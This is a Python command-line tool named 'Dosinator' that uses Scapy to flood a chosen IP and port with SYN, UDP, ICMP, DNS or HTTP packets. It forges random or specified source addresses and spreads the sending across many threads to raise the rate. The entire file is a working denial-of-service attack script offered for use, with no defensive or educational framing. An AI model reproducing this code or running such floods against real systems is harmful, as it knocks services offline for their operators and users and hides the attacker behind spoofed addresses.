import argparse
import random
import threading
import time
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import TCP, IP, ICMP, UDP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort, RandString


def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))


def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, custom_data=None):
    try:
        source_ip = spoof_ip() if spoof_ip else generate_random_ip()
        source_port = RandShort()

        if custom_data:
            payload = custom_data.encode()
        else:
            payload = Raw(RandString(size=packet_size))

        if attack_mode == "syn":
            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags='S') / payload
        elif attack_mode == "udp":
            packet = IP(src=source_ip, dst=target_ip) / UDP(sport=source_port, dport=target_port) / payload
        elif attack_mode == "icmp":
            packet = IP(src=source_ip, dst=target_ip) / ICMP() / payload
        elif attack_mode == "dns":
            domain = f"{generate_random_ip()}.com"
            packet = IP(src=source_ip, dst=target_ip) / UDP(sport=source_port, dport=target_port) / DNS(rd=1, qd=DNSQR(
                qname=domain)) / payload
        elif attack_mode == "http":
            headers = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)
            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port) / headers / payload
        else:
            print("Invalid attack mode.")
            return
        send(packet, verbose=False)
    except Exception as e:
        print(f"Error while sending packet: {e}")


stop_threads = False
def dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, duration, attack_mode, spoof_ip, custom_data=None):
    global stop_threads

    print(f"Target IP        : {target_ip}")
    print(f"Target Port      : {target_port}")
    print(f"Number of Packets: {num_packets}")
    print(f"Packet Size      : {packet_size} bytes")
    print(f"Attack Rate      : {attack_rate} packets/second")
    print(f"Duration         : {duration} seconds")
    print(f"Attack Mode      : {attack_mode}")
    print(f"Spoof IP         : {spoof_ip.__name__ if spoof_ip else 'Default'}")
    print()

    delay = 1 / attack_rate if attack_rate > 0 else 0
    start_time = time.time()
    sent_packets = 0

    def send_packets():
        nonlocal sent_packets
        while not stop_threads:
            if num_packets and sent_packets >= num_packets:
                break

            if duration and time.time() - start_time >= duration:
                break

            send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, custom_data)
            sent_packets += 1
            print(f"\rSent packet {sent_packets}", end="")
            time.sleep(delay)

    threads = []
    try:
        for _ in range(attack_rate):
            thread = threading.Thread(target=send_packets)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()
    except Exception as e:
        print(f"Error during attack: {e}")
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        stop_threads = True
        for thread in threads:
            thread.join()
    finally:
        print("\nAttack completed.")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Dosinator')
    parser.add_argument('-t', '--target',  required=True, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, required=True, help='Target port number')
    parser.add_argument('-np', '--num_packets', type=int, default=500, help='Number of packets to send (default: 500)')
    parser.add_argument('-ps', '--packet_size', type=int, default=64, help='Packet size in bytes (default: 64)')
    parser.add_argument('-ar', '--attack_rate', type=int, default=10, help='Attack rate in packets/second (default: 10)')
    parser.add_argument('-d ', '--duration', type=int, help='Duration of the attack in seconds')
    parser.add_argument('-am', '--attack-mode', choices=["syn", "udp", "icmp", "http", "dns"], default="syn", help='Attack mode (default: syn)')
    parser.add_argument('-sp', '--spoof-ip', default=None, help='Spoof IP address')
    parser.add_argument('--data', type=str, default=None, help='Custom data string to send')

    args = parser.parse_args()

    target_ip = args.target
    target_port = args.port
    num_packets = args.num_packets
    packet_size = args.packet_size
    attack_rate = args.attack_rate
    duration = args.duration
    attack_mode = args.attack_mode
    data = args.data

    if args.spoof_ip == "random":
        spoof_ip = generate_random_ip
    else:
        spoof_ip = lambda: args.spoof_ip if args.spoof_ip else None

    dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, duration, attack_mode, spoof_ip, data)
